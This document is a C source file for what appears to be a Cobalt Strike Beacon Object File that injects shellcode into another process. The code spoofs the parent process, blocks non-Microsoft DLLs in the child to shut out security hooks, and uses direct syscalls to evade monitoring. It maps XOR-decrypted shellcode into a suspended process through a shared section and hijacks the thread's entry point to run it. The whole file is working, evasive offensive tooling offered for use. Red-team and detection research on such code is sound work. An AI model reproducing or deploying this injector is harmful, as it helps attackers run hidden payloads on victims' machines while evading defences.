////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      MAPVIEWOFSECTION BOF                                                                                          //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o MapViewOfSection.o -c MapViewOfSection.c -masm=intel                                     //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include "beacon.h"
#include "helpers.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$InitializeProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$UpdateProcThreadAttribute(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
DECLSPEC_IMPORT WINBASEAPI void WINAPI KERNEL32$DeleteProcThreadAttributeList(LPPROC_THREAD_ATTRIBUTE_LIST);
DECLSPEC_IMPORT WINBASEAPI LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE, DWORD, SIZE_T);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CreateProcessA(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
DECLSPEC_IMPORT int MSVCRT$_stricmp(const char*, const char*);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                    PROC SPAWN                                                      //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

HANDLE GetParentHandle(char* parent)
{
    HANDLE hProcess = NULL;
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if(KERNEL32$Process32First(snapshot, &entry) == TRUE)
    {
        while(KERNEL32$Process32Next(snapshot, &entry) == TRUE)
        {
            if(MSVCRT$_stricmp(entry.szExeFile, parent) == 0)
            {
                CLIENT_ID cID;
                cID.UniqueThread = 0;
                cID.UniqueProcess = UlongToHandle(entry.th32ProcessID);

                OBJECT_ATTRIBUTES oa;
                InitializeObjectAttributes(&oa, 0, 0, 0, 0);

                NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &cID);

                if(hProcess != INVALID_HANDLE_VALUE)
                {
                    NtClose(snapshot);
                    snapshot = NULL;
                    return hProcess;
                }
                else
                {
                    BeaconPrintf(CALLBACK_ERROR, "Could not find parent process");
                    NtClose(snapshot);
                    snapshot = NULL;
                    return INVALID_HANDLE_VALUE;
                }
            }
        }
    }
    NtClose(snapshot);
    snapshot = NULL;
    return INVALID_HANDLE_VALUE;
}

PROCESS_INFORMATION Spawn(char* procPath, HANDLE parentHandle)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;

    myZeroMemory(&si, sizeof(si));
    myZeroMemory(&pi, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 2, 0, &attributeSize);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, attributeSize);
    KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &attributeSize);

    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(DWORD64), NULL, NULL);
    KERNEL32$UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parentHandle, sizeof(HANDLE), NULL, NULL);

    si.StartupInfo.cb = sizeof(si);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;

    if(!KERNEL32$CreateProcessA(procPath, NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi))
    {
        BeaconPrintf(CALLBACK_ERROR, "Could not spawn a surrogate process");
    }

    KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
    NtClose(parentHandle);
    parentHandle = NULL;

    return pi;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {
    if(8 != sizeof(void*))
    {
        BeaconPrintf(CALLBACK_ERROR, "Not a 64 bit system");
        return;
    }

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    SIZE_T shellcode_size;
    int payload_size;
    datap parser;

    BeaconDataParse(&parser, args, alen);

    char* parent = BeaconDataExtract(&parser, NULL);
    char* process = BeaconDataExtract(&parser, NULL);
    char* shellcode = BeaconDataExtract(&parser, &payload_size);

    if(payload_size == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "Payload too small: %d", payload_size);
        return;
    }
    else
    {
        shellcode_size = payload_size + 1;
    }

    shellcode = xordecrypt(shellcode, shellcode_size);

    /*==================================*/
    /*               SPAWN              */
    /*==================================*/

    PROCESS_INFORMATION pi = Spawn(process, GetParentHandle(parent));

    /*==================================*/
    /*          CREATE SECTION          */
    /*==================================*/

    NTSTATUS status;
    HANDLE hSection = NULL;
    LARGE_INTEGER section_size = { shellcode_size };
    status = NtCreateSection(&hSection, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not create section: %lx", status);
        goto lblCleanup;
    }

    /*==================================*/
    /*           MAP IN PROC            */
    /*==================================*/

    LPVOID remoteSectionAddress = 0;
    LPVOID localSectionAddress = 0;

    status = NtMapViewOfSection(hSection, KERNEL32$GetCurrentProcess(), &localSectionAddress, 0, 0, NULL, &shellcode_size, ViewUnmap, 0, PAGE_READWRITE);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not map section to local process: %lx", status);
        goto lblCleanup;
    }

    status = NtMapViewOfSection(hSection, pi.hProcess, &remoteSectionAddress, 0, 0, NULL, &shellcode_size, ViewUnmap, 0, PAGE_EXECUTE_READ);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not map section to remote process: %lx", status);
        NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localSectionAddress);
        goto lblCleanup;
    }

    myMemcpy(localSectionAddress, shellcode, shellcode_size);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copied shellcode");

    status = NtUnmapViewOfSection(KERNEL32$GetCurrentProcess(), localSectionAddress);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not unmap section from local process: %lx", status);
    }

    /*==================================*/
    /*          UPDATE ENTRYPOINT       */
    /*==================================*/

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    status = NtGetContextThread(pi.hThread, &ctx);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not get remote context: %lx", status);
        goto lblCleanup;
    }

    ctx.Rcx = (DWORD64)remoteSectionAddress;

    status = NtSetContextThread(pi.hThread, &ctx);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not set remote context: %lx", status);
        goto lblCleanup;
    }

    /*==================================*/
    /*          RESUME THREAD           */
    /*==================================*/

    status = NtResumeThread(pi.hThread, NULL);
    if(status != STATUS_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Could not resume remote thread: %lx", status);
        goto lblCleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] done\n");

lblCleanup:
    NtClose(hSection);
    NtClose(pi.hThread);
    NtClose(pi.hProcess);
    hSection = NULL;
    return;
}